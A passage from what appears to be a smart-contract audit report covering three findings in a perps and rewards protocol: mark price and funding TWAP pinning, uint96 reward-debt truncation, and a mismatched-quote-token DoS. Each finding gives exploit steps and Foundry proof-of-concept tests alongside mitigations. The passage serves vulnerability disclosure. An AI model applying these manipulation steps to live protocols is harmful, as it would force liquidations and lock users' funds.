            m.position[acct][sub] = p;
        }
    }

    function test_gas_scales_with_assets() public {
        address aSmall = address(0xA1);
        address aLarge = address(0xA2);
        uint256 sub = 0;

        // Build two accounts with different per-subaccount asset counts
        _setupMarkets(aSmall, sub, 5);
        _setupMarkets(aLarge, sub, 50);

        ClearingHouse storage ch = StorageLib.loadClearingHouse();
        (DynamicArrayLib.DynamicArray memory assets1, Position[] memory pos1, ) = ch.getAccountAndMargin(aSmall, sub);
        (DynamicArrayLib.DynamicArray memory assets2, Position[] memory pos2, ) = ch.getAccountAndMargin(aLarge, sub);

        uint256 g0 = gasleft();
        bool _ = ch.isLiquidatable(assets1, pos1, -1e18, BookType.STANDARD);
        uint256 used1 = g0 - gasleft();

        uint256 g1 = gasleft();
        _ = ch.isLiquidatable(assets2, pos2, -1e18, BookType.STANDARD);
        uint256 used2 = g1 - gasleft();

        // sanity (silence unused var warnings)
        assertTrue(true);

        // Linear growth: more assets -> more gas used
        assertGt(used2, used1);
    }
}


## Suggested Mitigation
Combine structural and accounting controls:

1) Hard-cap assets per subaccount: introduce a configurable maxAssetsPerSubaccount and enforce it in _assetCanBeAddedToAccount. If assets.length() >= cap and the incoming asset isn’t already present, reject the new open. This bounds worst-case loop cost deterministically.

2) Aggregate risk caches: maintain per-subaccount totals for intendedMargin, minMaintenanceMargin (by book type), and upnl. Update these aggregates incrementally on each trade/funding settlement for the touched asset only. Then, isLiquidatable and other risk checks can operate in O(1) time, independent of asset count.

3) Partial/liquidation sharding: support bounded-scope liquidation that only requires scanning or touching a fixed subset per tx (e.g., per-asset liquidation steps), allowing multi-tx convergence without requiring full-asset scans each time.

4) Operational guardrails: limit how many markets have crossMarginEnabled concurrently, and raise min position/lot size for cross-margin onboarding so dust positions are less economical for griefing.

Adopting (1) plus (2) ensures predictable and low gas for critical risk operations even as the protocol lists many markets.





 **Derived From** : Perps mark price & funding TWAP can be pinned via low-liquidity orderbook impact price

## [M-9]. Low-liquidity impact price TWAP lets attacker pin mark and funding using tiny self-placed orders

### Finding Severity Justification: An attacker can materially skew the perps mark price and funding in thin markets by manipulating two of the three inputs used for mark (impact price TWAP and basis-spread EMA). This can force adverse funding payments on honest traders and push them into liquidation, causing real losses. The attack is permissionless but requires low-liquidity conditions and timing around keeper mark updates, hence Medium.
## Derived From Pattern/Invariant
Perps mark price & funding TWAP can be pinned via low-liquidity orderbook impact price

## Exploit Type
TWAPWindowPinning

## Location
MarketLib / PriceHistoryLib.setMarkPrice / _cacheImpactPrice / _cacheBasisSpread / getImpactPriceTwap / ema

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: There is a known-issues note about TWAP manipulability, but this report additionally relies on the impactPrice fallback asymmetry and count-based EMA with zero timestamps for basis spread, which together enable the pinning even if TWAP were made stricter. Given that overlap is possible, confidence is marked somewhat rather than full.
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The mark price for each perps market is derived from three components, two of which depend directly on **orderbook-derived prices** with no liquidity floors or robust windowing. In thin markets, an attacker can cheaply manipulate these components over the TWAP/EMA window and thus skew mark price and funding.

Mark price computation:
```solidity
function setMarkPrice(Market storage self, uint256 indexPrice) internal returns (uint256 markPrice) {
    MarketMetadata storage metadata = StorageLib.loadMarketMetadata(self.asset);

    _cacheBasisSpread(self, indexPrice);
    _cacheImpactPrice(self);

    uint256 p1 = self.getFundingRateComponent(indexPrice);
    uint256 p2 = (indexPrice.toInt256() + self.getBasisSpreadEMA()).toUint256();
    uint256 p3 = self.getImpactPriceTwap();

    self.markPrice = markPrice = _getMedian(p1, p2, p3);
    metadata.markPriceHistory.snapshot(markPrice);
    metadata.indexPriceHistory.snapshot(indexPrice);
}
```

Key manipulable components:

1. **Impact price TWAP (`p3`):**

   * `_cacheImpactPrice` simulates a large trade against the orderbook without any liquidity floor:
   ```solidity
   function _cacheImpactPrice(Market storage self) private returns (uint256 impactPrice) {
       // impact notional is 500 * max leverage
       uint256 impactNotional = uint256(500e18)
           .fullMulDiv(StorageLib.loadMarketSettings(self.asset).maxOpenLeverage, 1e18);

       impactPrice = self.getImpactPrice(impactNotional);
       StorageLib.loadMarketMetadata(self.asset).impactPriceHistory.snapshot(impactPrice);
   }
   ```

   * `getImpactPrice` walks the book using `quoteBidInQuote` / `quoteAskInQuote` and the flawed fallback described in the previous finding. There is **no check that the book has sufficient depth** relative to `impactNotional`.

   * `getImpactPriceTwap` performs a simple time-weighted average over recent snapshots with window `fundingInterval`:
   ```solidity
   function getImpactPriceTwap(Market storage self) internal view returns (uint256 impactPriceTwap) {
       bytes32 asset = self.asset;
       return StorageLib.loadMarketMetadata(asset).impactPriceHistory.twap(
           StorageLib.loadFundingRateEngine(asset).getFundingInterval(asset)
       );
   }
   ```

   * `PriceHistoryLib.twap` does not enforce a minimum number of observations or any price-deviation clamps; if there is only one snapshot, it simply returns that price regardless of age or how it was obtained.

2. **Basis spread EMA (`p2`):**

   * `_cacheBasisSpread` snapshots the difference between mid price and index:
   ```solidity
   function _cacheBasisSpread(Market storage self, uint256 indexPrice) private {
       uint256 midPrice = self.getMidPrice();
       if (midPrice == 0) return;
       int256 basisSpread = midPrice.toInt256() - indexPrice.toInt256();
       StorageLib.loadMarketMetadata(self.asset).basisSpreadHistory.snapshotBasisSpread(basisSpread);
   }
   ```

   * `getBasisSpreadEMA` uses a **count-based** EMA window (15 minutes treated as `period` = count) over historical basis spreads with no guarantee of time spacing:
   ```solidity
   function ema(PriceHistory storage history, uint256 period) internal view returns (int256) {
       uint256 n = history.snapshots.length;
       if (n == 0 || period == 0) return 0;
       uint256 count = period <= n ? period : n;
       ... // basic EMA over last `count` entries, ignoring timestamps
   }
   ```

   * Since `snapshotBasisSpread` stores snapshots with `timestamp = 0`, the EMA depends purely on the number of recorded points, not how far apart in time they are. A flurry of manipulative mid-price updates in a short time can dominate the EMA for a long period.

Because the orderbook (CLOB) is fully on-chain and permissionless, an attacker can cheaply **dominate liquidity in a new or thin market** and then:

1. Place small, self-crossable orders at extreme prices to set an artificial midPrice and to control the behavior of `getImpactPrice`.
2. Call or front-run keeper calls to `setMarkPrice(indexPrice)` around funding intervals.
3. Each call to `_cacheImpactPrice` and `_cacheBasisSpread` records highly skewed values into `impactPriceHistory` and `basisSpreadHistory`.
4. `getImpactPriceTwap` and `getBasisSpreadEMA` over short windows (small `fundingInterval`, `period = 15 minutes`) then become dominated by these attacker-chosen snapshots.
5. As a result, two of the three mark components `(p2, p3)` can be moved in the same direction, causing the median mark price to track the attacker's manipulated book rather than the external index.
6. Over multiple funding intervals, this skew feeds back into `FundingRateEngine.settleFunding`, allowing the attacker to:
   * Collect favorable funding by holding long/short positions across multiple accounts.
   * Push other traders into liquidation (e.g. mark >> index for shorts) and profit as liquidator.

There are **no protective conditions** like:

* Minimum total resting depth at or near top of book,
* Maximum allowed divergence between impact/mid prices and the trusted external index,
* Minimum number of snapshots and wall-clock duration required before trusting TWAP/EMA.

As a consequence, especially in early or low-interest markets, the attacker can pin mark price and funding around arbitrary levels with tiny amounts of capital by dominating the CLOB and timing mark updates.


## Impact
Because setMarkPrice() takes the median of three components where two are directly orderbook-derived (p2 = index + basisSpreadEMA and p3 = impactPrice TWAP), an attacker dominating a thin book can move both p2 and p3 in the same direction. PriceHistoryLib.twap returns the last in-window snapshot even if it’s the only one, and basisSpreadHistory.ema is count-based and ignores timestamps (snapshots store timestamp = 0). Combined with getImpactPrice() falling back to nonsensical base adjustments when the book cannot fill the configured impactNotional, an attacker can cheaply pin the mark above/below the index around keeper updates. This induces predictable funding transfers over multiple intervals, and can push opposite-side traders towards liquidation at manipulated marks, creating real economic loss for users/insurance while the attacker stays largely market-neutral.

## Command to Run Test


## Proof of Concept
Steps to pin mark/funding in a thin market:

1) Preconditions
- Choose a low-liquidity market with small fundingInterval and infrequent keepers calling setMarkPrice().
- Ensure you can call (or front‑run) setMarkPrice(indexPrice) around interval boundaries.

2) Prepare the orderbook
- Post tiny best bid and best ask yourself (wide apart) so getMidPrice() is whatever mid you desire. This makes _cacheBasisSpread() snapshot a large positive/negative basis (mid - index).
- Ensure the book depth is minimal, so getImpactPrice(impactNotional) will be computed using the fallback branches when quoteUsed < impactNotional, yielding unrealistic impactBid/impactAsk values.

3) Pin the impact TWAP (p3)
- Right before a keeper calls setMarkPrice(), place a self‑crossable micro‑order configuration that makes getImpactPrice() return an extreme value (due to low depth and the fallback). This value is snapshotted into impactPriceHistory.
- If the fundingInterval window contains only your fresh snapshot (no other in‑window values), PriceHistoryLib.twap will return exactly that manipulated value for p3.

4) Dominate the basis EMA (p2)
- Spam snapshotBasisSpread() indirectly by triggering setMarkPrice() repeatedly (or whenever you can influence mid) to add many clustered basis snapshots. Because PriceHistoryLib.ema(15 minutes) uses a count‑based window and snapshotBasisSpread sets timestamp=0, the EMA ignores time spacing and rapidly converges to your chosen basis direction.

5) Median mark control
- With p2 and p3 pulled to the same side, the median of (p1 ~ index, p2, p3) becomes your manipulated side (p2 or p3), pinning mark.

6) Profit paths
- Open offsetting long/short across your own accounts. Maintain the skew across successive funding intervals; funding flows net to you.
- When the market is net‑short (or net‑long), push mark against them around keeper updates to force liquidations and capture profit as liquidator, while remaining roughly market‑neutral.

Notes: No minimum liquidity checks or index divergence clamps protect these mark inputs. The time windowing for TWAP/EMA is insufficient, enabling deterministic pinning with tiny capital.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {PriceHistory, PriceHistoryLib} from "contracts/perps/types/PriceHistory.sol";

contract MarkInputsManipulationTest is Test {
    using PriceHistoryLib for PriceHistory;

    PriceHistory internal impactHistory;
    PriceHistory internal basisHistory;

    // Demonstrates that if only one snapshot exists in the window,
    // TWAP equals that (manipulated) snapshot regardless of older data.
    function testImpactTwapPinnedBySingleSnapshotInWindow() public {
        // Honest historical snapshots (outside the future TWAP window)
        vm.warp(1000);
        impactHistory.snapshot(1_000e18);
        vm.warp(1100);
        impactHistory.snapshot(1_010e18);

        // Attacker manipulates orderbook, causing an extreme impact price at t=1200
        vm.warp(1200);
        impactHistory.snapshot(10_000e18);

        // Funding interval window = 100s -> window is [1200, 1300]
        // Only the manipulated snapshot is in-window.
        vm.warp(1300);
        uint256 twap = impactHistory.twap(100);

        assertEq(twap, 10_000e18, "TWAP should equal the manipulated snapshot when it is the sole in-window value");
    }

    // Demonstrates that basis EMA ignores time spacing and can be dominated by clustered snapshots.
    function testBasisEmaDominatedBySpamSnapshotsIgnoringTime() public {
        // A couple of honest values
        basisHistory.snapshotBasisSpread(0);
        basisHistory.snapshotBasisSpread(0);

        // Attacker spams many negative spreads in rapid succession
        for (uint256 i = 0; i < 20; ++i) {
            basisHistory.snapshotBasisSpread(-5e18);
        }

        // Period is treated as a COUNT, not time; clustered values dominate the EMA
        int256 emaVal = basisHistory.ema(15 minutes);
        assertLt(emaVal, -2e18, "EMA should be pulled strongly negative by clustered entries, regardless of time");
    }
}


## Suggested Mitigation
Hardening options (apply several):

1) Impact price safety and liquidity floors
- In getImpactPrice(), if quoteUsed < impactNotional on either side, do not apply the current fallback that adds ~0 base on bids and huge base on asks. Instead:
  - Revert the impact computation as invalid for this interval, or
  - Return an optional flag and skip caching impactPrice (omit p3 from the median) when available resting depth is below a configurable minimum fraction of impactNotional.
- Alternatively, compute impact price against the actually-fillable notional and require a minimum book depth threshold before trusting it.

2) Divergence clamps vs index
- Before accepting p2 or p3 into the median, enforce bounds such as |candidate - index| <= divergenceCap * index.
- If exceeded, cap to the bound or drop the outlier from the median (fall back to remaining components).

3) Robust windowing requirements
- TWAP: require at least N snapshots spanning at least M seconds inside the window; otherwise, treat the component as invalid and fall back (e.g., to index or omit p3 from median).
- EMA: stop using count-based period. Store real timestamps for basis snapshots (do not set timestamp=0) and implement a time-based EMA (or time-weighted average) that ignores clustered spam and enforces minimum span.

4) Median gating and health checks
- If fewer than K healthy components (after the checks above), default mark to index or to a conservative composite (e.g., median(index, clamped p2, clamped p3)).
- Consider a trimmed-mean/median-of-5 approach with duplicate independent signals if available (e.g., external TWAP oracle), then trim extremes.

5) Operational controls
- Rate-limit mark snapshots and basis updates if the underlying book depth (near top of book) falls below a configurable threshold.

Collectively these remove the ability to pin p3 with a single snapshot, prevent count-based EMA spam, and eliminate pathological impactPrice fallbacks when the book lacks sufficient liquidity.





 **Derived From** : Reward debt uint96 truncation can break rewards accounting and lock claims

## [L-10]. Unsafe uint96 rewardDebt truncation in RewardsTracker can overflow and DoS reward claiming for large pools

### Finding Severity Justification: The downcast of per-user reward debt to uint96 can truncate when cumulative per-user accrued rewards exceed 2^96 - 1, corrupting accounting and causing claim/increaseStake/decreaseStake to revert via ClaimAmountExceedsTotalPendingRewards. Impact is a denial-of-service of reward claiming (and stake adjustments) for affected users. However, triggering requires extremely large lifetime rewards (on the order of 7.9e28 token units per user), which is unlikely under typical configurations and fee-driven accruals, though still possible due to permissionless addRewards and potentially very large token supplies.
## Derived From Pattern/Invariant
Reward debt uint96 truncation can break rewards accounting and lock claims

## Exploit Type
AccountingInvariantViolation

## Location
RewardsTrackerLib.stake/unstake/claim (via Distributor.increaseStake/decreaseStake/claimRewards)

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: The core overflow/truncation behavior and revert path are clear. The practical likelihood hinges on whether cumulative rewards can realistically exceed the uint96 bound for in-scope tokens; without explicit supply/amount caps in contest docs, this remains somewhat uncertain.
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
RewardsTrackerLib stores per-user reward debt (`baseRewardDebt`, `quoteRewardDebt`) as `uint96`, but computes them as full `uint256` values and then downcasts without any bounds checking. Over time, as rewards accumulate and/or share counts are large, the cumulative reward `totalAccRewards` can exceed `2^96 - 1`, at which point the cast will silently truncate high bits and corrupt the accounting.

Key snippets:

```solidity
struct UserRewardData {
    uint96 shares;
    uint96 baseRewardDebt;
    uint96 quoteRewardDebt;
}

uint128 public constant PRECISION_FACTOR = 1e12;

function totalAccRewards(uint256 shares, uint256 accRewardsPerShare) internal pure returns (uint256) {
    return (shares * accRewardsPerShare) / PRECISION_FACTOR;
}

function stake(RewardPoolData storage self, address user, uint96 newShares)
    internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    userData.baseRewardDebt = uint96(totalAccRewards(existingShares + newShares, accBaseRewardsPerShare));
    userData.quoteRewardDebt = uint96(totalAccRewards(existingShares + newShares, accQuoteRewardsPerShare));
}

function unstake(RewardPoolData storage self, address user, uint96 removeShares)
    internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    userData.baseRewardDebt = uint96(totalAccRewards(existingShares - removeShares, accBaseRewardsPerShare));
    userData.quoteRewardDebt = uint96(totalAccRewards(existingShares - removeShares, accQuoteRewardsPerShare));
}

function claim(RewardPoolData storage self, address user)
    internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    uint256 totalAccBaseRewards = totalAccRewards(shares, accBaseRewardsPerShare);
    uint256 totalAccQuoteRewards = totalAccRewards(shares, accQuoteRewardsPerShare);

    baseAmount = totalAccBaseRewards - uint128(userData.baseRewardDebt);
    quoteAmount = totalAccQuoteRewards - uint128(userData.quoteRewardDebt);

    userData.baseRewardDebt = uint96(totalAccBaseRewards);
    userData.quoteRewardDebt = uint96(totalAccQuoteRewards);
}
```

`accBaseRewardPerShare` / `accQuoteRewardPerShare` grow monotonically with each reward addition, and `shares` can be up to ~7.9e28 (`uint96`). There is no cap on their product before division by `PRECISION_FACTOR`. Once `totalAccRewards(shares, accRewardsPerShare) > type(uint96).max`, the assignment to `uint96` will wrap modulo `2^96`, storing a much smaller or otherwise unrelated debt.

Consequences:
* The next time a user stakes/unstakes/claims, `baseAmount`/`quoteAmount` is computed as `full 256-bit totalAccRewards - truncatedDebt`. This can yield an **artificially large pending reward** that was never actually funded.
* Distributor uses these amounts to drive its global accounting and payouts:

```solidity
function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
    if (baseAmount > 0) {
        _decreaseTotalPending(base, baseAmount);
        base.safeTransfer(msg.sender, baseAmount);
    }
    if (quoteAmount > 0) {
        _decreaseTotalPending(quote, quoteAmount);
        quote.safeTransfer(msg.sender, quoteAmount);
    }
}

function _decreaseTotalPending(address asset, uint256 amount) internal {
    uint256 currTotal = totalPendingRewards[asset];
    if (currTotal < amount) revert ClaimAmountExceedsTotalPendingRewards();
    unchecked { totalPendingRewards[asset] -= amount; }
}
```

* When a truncated debt leads to an oversized `baseAmount` / `quoteAmount`, `_decreaseTotalPending` will revert once `amount` exceeds `totalPendingRewards[asset]`. That reverts the entire `claimRewards` / `increaseStake` / `decreaseStake` call, **blocking all further reward operations** for that user and potentially for the whole pool if many users reach the overflowed regime.

Because `addRewards` is permissionless, an attacker can deliberately push the per-share indices toward this overflow threshold by contributing very large reward amounts over time while totalShares is moderate, making the wraparound realistic in a high-volume pool. Once triggered for any user, the core invariant

`sum(user pending rewards) <= totalPendingRewards[asset]`

no longer holds, and correct reward distribution cannot proceed.

## Impact
Overflowed downcast of reward debt to uint96 corrupts per-user accounting once cumulative rewards exceed 2^96 - 1. The critical corruption occurs when stake/unstake write userData.{base,quote}RewardDebt = uint96(totalAccRewards(...)) after accPerShare has grown beyond 96 bits. From then on, the next claim computes totalAccRewards - truncatedDebt, which can be far larger than the actual pending rewards tracked by Distributor. This causes _decreaseTotalPending() to revert with ClaimAmountExceedsTotalPendingRewards, DoSing reward claiming and any stake adjustments that trigger distributions for the affected user. Other users remain unaffected unless multiple users independently reach the overflowed regime, in which case many accounts can become stuck.

## Command to Run Test


## Proof of Concept
Attack/high-level steps:
1) Setup: A user has non-zero shares in the rewards pool.
2) Add a modest reward R1 and have the user claim it, so their stored rewardDebt reflects a correct pre-overflow totalAccRewards (T1).
3) Add a very large reward R2 so that the new totalAccRewards (T2 = T1 + R2) exceeds 2^96 - 1.
4) Call increaseStake (or decreaseStake) for the user with a non-zero delta. This function:
   - First realizes pending rewards (pays out R2, reducing totalPendingRewards to reflect the payout).
   - Then writes userData.rewardDebt = uint96(totalAccRewards(...)). Because T2 > 2^96 - 1, this assignment silently truncates.
5) Now, when the user calls claimRewards, RewardsTrackerLib computes baseAmount = totalAccRewards - truncatedDebt, which is artificially huge and no longer backed by totalPendingRewards (now near zero after step 4). Distributor._decreaseTotalPending() detects amount > totalPendingRewards and reverts with ClaimAmountExceedsTotalPendingRewards.
6) From this point, any operation that tries to realize these rewards (claim/increaseStake/decreaseStake) reverts for that user, effectively DoSing their rewards and stake operations.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract ERC20Mock {
    string public name; string public symbol; uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    constructor(string memory n, string memory s) { name = n; symbol = s; }
    function transfer(address to, uint256 v) external returns (bool) { balanceOf[msg.sender] -= v; balanceOf[to] += v; return true; }
    function transferFrom(address from, address to, uint256 v) external returns (bool) { uint256 a = allowance[from][msg.sender]; if (a != type(uint256).max) allowance[from][msg.sender] = a - v; balanceOf[from] -= v; balanceOf[to] += v; return true; }
    function approve(address s, uint256 v) external returns (bool) { allowance[msg.sender][s] = v; return true; }
    function mint(address to, uint256 v) external { balanceOf[to] += v; }
}

contract RewardDebtOverflow_DoS_Test is Test {
    Distributor dist;
    ERC20Mock L; // launch asset (base)
    ERC20Mock Q; // quote asset (rewards)

    function setUp() public {
        dist = new Distributor();
        dist.initialize(address(this)); // make this test the launchpad (onlyLaunchpad)
        L = new ERC20Mock("L", "L");
        Q = new ERC20Mock("Q", "Q");
        // Create the rewards pair (base=L, quote=Q)
        dist.createRewardsPair(address(L), address(Q));
        // Give the test account an initial stake so rewards can accrue
        dist.increaseStake(address(L), address(this), 1); // shares = 1
    }

    function test_DoS_after_uint96_rewardDebt_truncation() public {
        // 1) Add a modest reward and claim it to establish a correct (pre-overflow) rewardDebt
        uint256 R1 = 1e18;
        Q.mint(address(this), R1);
        Q.approve(address(dist), type(uint256).max);
        dist.addRewards(address(L), address(Q), 0, uint128(R1));
        // Claim R1 so rewardDebt is set to T1
        dist.claimRewards(address(L));

        // 2) Add a very large reward so totalAccRewards > 2^96 - 1
        uint256 R2 = 2 ** 120; // fits into uint128
        Q.mint(address(this), R2);
        dist.addRewards(address(L), address(Q), 0, uint128(R2));

        // 3) Trigger overflowed downcast by touching rewardDebt in stake()
        //    This will first pay out R2 (reducing totalPendingRewards to ~0),
        //    then set rewardDebt = uint96(totalAccRewards) (truncated).
        dist.increaseStake(address(L), address(this), 1); // non-zero to avoid ZeroShareStake

        // 4) Now any attempt to claim will compute a huge amount and revert on _decreaseTotalPending
        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        dist.claimRewards(address(L));
    }
}


## Suggested Mitigation
Eliminate narrowing casts for reward debts. Recommended fixes:
- Store baseRewardDebt and quoteRewardDebt as uint256 (preferred), or at least uint128 with hard caps on cumulative rewards to ensure no overflow is possible.
- If struct packing/gas is a concern, add explicit bounds checks before assignment and revert on overflow:
  - Compute newDebt = totalAccRewards(...); if (newDebt > type(uint96).max) revert RewardDebtOverflow(); else store.
- Consider saturating arithmetic or invariant guards in addRewards to ensure (accRewardsPerShare * maxShares) / PRECISION_FACTOR cannot exceed the chosen debt type across the system’s lifetime.

Using uint256 for reward debts is the most future-proof and avoids silent truncation entirely.





 **Derived From** : addRewards allows mismatched quote token, desyncing accounting and bricking reward claims

## [M-11]. Mismatched quote token in Distributor.addRewards bricks rewards pool and permanently locks added rewards

### Finding Severity Justification: Any user can permissionlessly call Distributor.addRewards with a mismatched quote token for an existing rewards pool. This desynchronizes internal accounting (pendingQuoteRewards vs totalPendingRewards mapping), causing all subsequent quote-reward distributions (claimRewards, increaseStake/unstake for existing stakers) to revert with ClaimAmountExceedsTotalPendingRewards(). This effectively DoS-es quote reward claims for the affected launch asset and can halt normal reward flows, while also permanently locking the incorrectly added tokens inside Distributor. Impact is significant on protocol functionality and matured yield availability, but there is no direct theft; hence Medium.
## Derived From Pattern/Invariant
addRewards allows mismatched quote token, desyncing accounting and bricking reward claims

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.addRewards

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Distributor.addRewards is permissionless and accepts arbitrary token0/token1. It only checks that one of them has an existing rewards pool, but does not enforce that the *other* token matches the pool’s configured quote asset. When called with the correct launchAsset but a wrong quote token, it credits the pool’s pending quote rewards and totalPendingRewards under the wrong ERC20 key. Later, when users claim or when Launchpad adjusts stake, the Distributor tries to decrement totalPendingRewards for the *configured* quoteAsset, which is 0, and reverts with ClaimAmountExceedsTotalPendingRewards(). This permanently breaks quote reward claiming for that launch asset and traps the mis-specified quote tokens in the Distributor.

Vulnerable flow (Distributor.sol):

```solidity
function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    (address launchAsset, address quoteAsset, uint128 launchAssetAmount, uint128 quoteAssetAmount) =
        (token0, token1, amount0, amount1);
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(token0);

    if (rs.quoteAsset == address(0)) {
        rs = RewardsTrackerStorage.getRewardPool(token1);

        if (rs.quoteAsset == address(0)) revert RewardsDoNotExist();

        (launchAsset, quoteAsset, launchAssetAmount, quoteAssetAmount) = (token1, token0, amount1, amount0);
    }

    if (rs.totalShares == 0) revert NoSharesToIncentivize();

    if (launchAssetAmount > 0) {
        rs.addBaseRewards(launchAsset, launchAssetAmount);
        _increaseTotalPending(launchAsset, launchAssetAmount);
        launchAsset.safeTransferFrom(msg.sender, address(this), uint256(launchAssetAmount));
    }

    if (quoteAssetAmount > 0) {
        rs.addQuoteRewards(launchAsset, quoteAsset, quoteAssetAmount);
        _increaseTotalPending(quoteAsset, quoteAssetAmount);
        quoteAsset.safeTransferFrom(msg.sender, address(this), uint256(quoteAssetAmount));
    }
}
```

If a pool exists for `launchAsset = L` with `rs.quoteAsset == Q`, then calling `addRewards(L, X, 0, amount)` (X ≠ Q) skips the second branch and sets `launchAsset=L`, `quoteAsset=X`. It then:
- credits `rs.pendingQuoteRewards += amount` (RewardsTrackerLib.addQuoteRewards), conceptually treating `amount` as rewards in token Q,
- increments `totalPendingRewards[X] += amount`, and
- transfers `amount` of token X into the Distributor.

When a staker later triggers a payout via `increaseStake`, `decreaseStake`, or `claimRewards`, the library computes a nonzero `quoteAmount` (because pendingQuoteRewards was increased). Distributor then executes:

```solidity
_distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount);

function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
    if (quoteAmount > 0) {
        _decreaseTotalPending(quote, quoteAmount);
        quote.safeTransfer(msg.sender, quoteAmount);
    }
}

function _decreaseTotalPending(address asset, uint256 amount) internal {
    uint256 currTotal = totalPendingRewards[asset];
    if (currTotal < amount) revert ClaimAmountExceedsTotalPendingRewards();
    unchecked { totalPendingRewards[asset] -= amount; }
}
```

Here `quote` is `rs.quoteAsset == Q`, but `totalPendingRewards[Q]` was never incremented for this tranche (only `totalPendingRewards[X]` was). Thus `currTotal == 0`, `quoteAmount > 0`, and `_decreaseTotalPending` reverts. From that point on, any interaction that attempts to pay quote rewards for this pool reverts, effectively bricking quote rewards for that launch asset.

Additionally, the mis-specified quote tokens X are stuck:
- `totalPendingRewards[X] == balanceOf(X, Distributor)` makes skimExcessRewards see no "excess" because `balance - totalPendingRewards == 0`,
- but no code path ever distributes X to users (the pool’s quoteAsset is Q), so they cannot be claimed.

## Impact
Any address can add rewards to an existing pool using a wrong quote token. This desynchronizes pool-level accounting (pendingQuoteRewards) from Distributor.totalPendingRewards, causing claimRewards, increaseStake, and decreaseStake to revert with ClaimAmountExceedsTotalPendingRewards for that launch asset. The incorrectly supplied tokens become non-claimable and non-skimmable (balance equals totalPendingRewards), effectively locking them inside Distributor. The DoS persists until enough of the correct quote token is injected to cover the accrued quote liabilities; even then, the wrong-token deposit remains permanently locked and the attack can be repeated to grief the protocol.

## Command to Run Test


## Proof of Concept
Setup and exploit steps:
1) Assume a rewards pool exists for (launchAsset L, quoteAsset Q) and has nonzero shares (normal operation) so addRewards will not revert with NoSharesToIncentivize.
2) Attacker deploys an ERC20 X.
3) Attacker calls Distributor.addRewards(L, X, 0, amountX) with amountX > 0.
   - rs = getRewardPool(L) (exists), branch isn’t swapped.
   - The function credits rs.pendingQuoteRewards += amountX and increases totalPendingRewards[X] += amountX, then pulls amountX of X into Distributor.
4) When any L staker triggers claimRewards/increaseStake/decreaseStake, RewardsTracker computes a nonzero quoteAmount from the newly credited pendingQuoteRewards. Distributor then calls _decreaseTotalPending(rs.quoteAsset=Q, quoteAmount), but totalPendingRewards[Q] was never increased for this tranche (it was keyed under X), so it reverts with ClaimAmountExceedsTotalPendingRewards.
5) From this point, any interaction that attempts to distribute quote rewards for L reverts until the protocol injects enough Q to cover the liability. The X tokens are stuck because skimExcessRewards sees no excess (balanceOf[X] - totalPendingRewards[X] == 0).

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract ERC20Mock {
    string public name; string public symbol; uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _n, string memory _s) { name = _n; symbol = _s; }

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transfer(address to, uint256 value) external returns (bool) {
        require(balanceOf[msg.sender] >= value, "bal");
        balanceOf[msg.sender] -= value; balanceOf[to] += value;
        emit Transfer(msg.sender, to, value); return true;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value; return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        require(balanceOf[from] >= value, "bal");
        require(allowance[from][msg.sender] >= value, "allow");
        allowance[from][msg.sender] -= value; balanceOf[from] -= value; balanceOf[to] += value;
        emit Transfer(from, to, value); return true;
    }

    function mint(address to, uint256 value) external {
        balanceOf[to] += value; totalSupply += value; emit Transfer(address(0), to, value);
    }
}

contract DistributorAddRewardsMismatchTest is Test {
    Distributor dist;
    ERC20Mock launch; // L
    ERC20Mock quote;  // Q
    ERC20Mock wrongQuote; // X

    address user = address(0xBEEF);
    address attacker = address(0xABCD);

    function setUp() public {
        dist = new Distributor();
        // set this test contract as owner in constructor; now init launchpad = this
        dist.initialize(address(this));

        launch = new ERC20Mock("Launch", "L");
        quote = new ERC20Mock("Quote", "Q");
        wrongQuote = new ERC20Mock("Wrong", "X");

        // Launchpad creates rewards pair L/Q
        dist.createRewardsPair(address(launch), address(quote));

        // Seed shares via onlyLaunchpad function so rs.totalShares > 0
        // This simulates bonding shares existing for user
        dist.increaseStake(address(launch), user, uint96(100));
    }

    function testAddRewardsWithWrongQuoteBricksClaims() public {
        // Fund attacker with wrongQuote and approve Distributor
        wrongQuote.mint(attacker, 1e18);
        vm.prank(attacker);
        wrongQuote.approve(address(dist), 1e18);

        // Attacker calls addRewards with launchAsset=L and wrong quote token X
        vm.prank(attacker);
        dist.addRewards(address(launch), address(wrongQuote), 0, uint128(1e18));

        // Accounting got keyed under X instead of real quote Q
        assertEq(dist.totalPendingRewards(address(wrongQuote)), 1e18, "pending keyed under X");
        assertEq(dist.totalPendingRewards(address(quote)), 0, "no pending under Q");

        // User tries to claim -> will revert because totalPendingRewards[Q] < quoteAmount
        vm.prank(user);
        vm.expectRevert(abi.encodeWithSignature("ClaimAmountExceedsTotalPendingRewards()"));
